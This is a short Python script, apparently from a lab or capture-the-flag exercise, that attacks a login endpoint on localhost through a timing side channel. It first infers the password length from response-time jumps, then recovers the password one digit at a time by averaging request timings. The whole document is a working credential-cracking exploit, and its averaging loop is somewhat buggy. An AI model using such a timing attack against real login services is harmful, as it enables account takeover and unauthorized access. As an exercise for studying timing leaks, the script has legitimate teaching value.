import requests
import time

usr = "aaaa" #123456789
usr = "bbbb" #12345
#usr = "cccc" #123
psw = ""

oldtime = 1000
passlen = 0

for i in range(1, 11):
    psw += "0"
    url = "http://localhost:3000/login?username=" + usr + "&password=" + psw
    print(url)
    comptime = time.time()
    resp  = requests.post(url)
    comptime = time.time() - comptime
    print(resp)
    print(comptime)
    if comptime <= oldtime*2:
        oldtime = comptime
        continue
    else:
        passlen = i
        oldtime = comptime
        break

print(passlen)
print (psw)
avg = 3

for i in range(passlen):
    print("##########")
    print("Testing pos: " + str(i))
    for j in range(1, 10):
        if i == passlen:
            psw = psw[:i] + str(j)
        else:
            psw = psw[:i] + str(j) + psw[i+1:]
        url = "http://localhost:3000/login?username=" + usr + "&password=" + psw
        print(url)
        for _ in range(avg):
            currtime = time.time()
            resp  = requests.post(url)
            comptime += time.time() - currtime
        comptime /= avg
        print(resp)
        print(comptime)
        if comptime <= oldtime + 1.3:
            oldtime = comptime
            continue
        else:
            oldtime = comptime
            break

print(usr)
print(psw)